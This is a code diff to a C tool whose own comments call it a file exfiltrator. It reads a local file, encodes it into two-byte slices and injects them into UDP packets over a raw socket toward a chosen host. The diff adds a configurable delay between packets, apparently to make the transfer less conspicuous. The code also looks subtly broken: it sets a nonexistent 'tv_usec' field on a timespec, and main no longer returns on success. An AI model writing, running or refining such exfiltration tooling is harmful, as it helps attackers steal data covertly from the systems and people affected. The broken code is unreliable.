@@ -18,11 +18,13 @@ void print_help() {
          "-[-f]ile    - the path to the file to send\n"
          "-[-p]ort    - the server port to connect to\n"
          "-[-h]ost    - the host to connect to\n"
+         "-[-d]elay   - seconds between messages\n"
          "--help      - this message\n");
 }
 
 int main(int argc, char** argv) {
     int port         = 34854;
+    int delay        = 1;
     const char* path = 0;
     const char* host = 0;
     int choice;
@@ -31,16 +33,17 @@ int main(int argc, char** argv) {
         int option_index = 0;
 
 #ifndef NDEBUG
-#define OPTSTR "vtp:f:h:"
-        static struct option long_options[]
-            = {{"version", no_argument, 0, 'v'}, {"test", no_argument, 0, 't'},
-                {"file", required_argument, 0, 'f'}, {"host", required_argument, 0, 'h'},
-                {"port", required_argument, 0, 'p'}, {"help", no_argument, 0, '?'}, {0, 0, 0, 0}};
-#else
-#define OPTSTR "vp:f:h:"
+#define OPTSTR "vtp:f:h:d:"
         static struct option long_options[] = {{"version", no_argument, 0, 'v'},
-            {"file", required_argument, 0, 'f'}, {"host", required_argument, 0, 'h'},
+            {"test", no_argument, 0, 't'}, {"file", required_argument, 0, 'f'},
+            {"host", required_argument, 0, 'h'}, {"delay", required_argument, 0, 'd'},
             {"port", required_argument, 0, 'p'}, {"help", no_argument, 0, '?'}, {0, 0, 0, 0}};
+#else
+#define OPTSTR "vp:f:h:d:"
+        static struct option long_options[]
+            = {{"version", no_argument, 0, 'v'}, {"file", required_argument, 0, 'f'},
+                {"host", required_argument, 0, 'h'}, {"delay", required_argument, 0, 'd'},
+                {"port", required_argument, 0, 'p'}, {"help", no_argument, 0, '?'}, {0, 0, 0, 0}};
 #endif
 
         choice = getopt_long(argc, argv, OPTSTR, long_options, &option_index);
@@ -49,6 +52,9 @@ int main(int argc, char** argv) {
         switch (choice) {
             case 'v':
                 puts("v0.1");
+                break;
+            case 'd':
+                delay = atoi(optarg);
                 break;
             case 'p':
                 port = atoi(optarg);
@@ -76,43 +82,46 @@ int main(int argc, char** argv) {
         return EXIT_FAILURE;
     }
 
-    return exfil_file(path, host, port);
-}
+    //exfil the file
+    {
+        struct sockaddr_storage storage;
+        make_storage(&storage, host, port);
+        int sfd;
 
-int exfil_file(const char* path, const char* host, const int port) {
-    struct sockaddr_storage storage;
-    make_storage(&storage, host, port);
-    int sfd;
+        ensure((sfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) != -1);
 
-    ensure((sfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) != -1);
+        encoder_frame_t enc;
 
-    encoder_frame_t enc;
+        FILE* fp = fopen(path, "r");
+        if (!fp) {
+            perror("error opening file");
+            return 1;
+        }
 
-    FILE* fp = fopen(path, "r");
-    if (!fp) {
-        perror("error opening file");
-        return 1;
-    }
+        uint8_t buffer[MAX_BUFF + 1];
 
-    uint8_t buffer[MAX_BUFF + 1];
+        size_t len = fread(buffer, sizeof(uint8_t), MAX_BUFF, fp);
 
-    size_t len = fread(buffer, sizeof(uint8_t), MAX_BUFF, fp);
+        if (ferror(fp)) {
+            fputs("error reading file", stderr);
+        } else {
+            buffer[len++] = '\0'; //just to be safe
+        }
 
-    if (ferror(fp)) {
-        fputs("error reading file", stderr);
-    } else {
-        buffer[len++] = '\0'; //just to be safe
-    }
+        fclose(fp);
 
-    fclose(fp);
+        outbound_encoder_init(&enc, buffer, len, 2);
 
-    outbound_encoder_init(&enc, buffer, len, 2);
+        struct timespec ns, rs;
+        ns.tv_sec = delay;
+        ns.tv_usec = 0;
 
-    uint8_t slice[2];
-    while (!encoder_finished(&enc)) {
-        encoder_get_next(&enc, slice);
-        printf("%0X %0X\n", slice[0], slice[1]);
-        insert_udp_slice(sfd, &storage, slice);
-        usleep(10000);
+        uint8_t slice[2];
+        while (!encoder_finished(&enc)) {
+            encoder_get_next(&enc, slice);
+            printf("%0X %0X\n", slice[0], slice[1]);
+            insert_udp_slice(sfd, &storage, slice);
+            nanosleep(&ns, &rs);
+        }
     }
 }
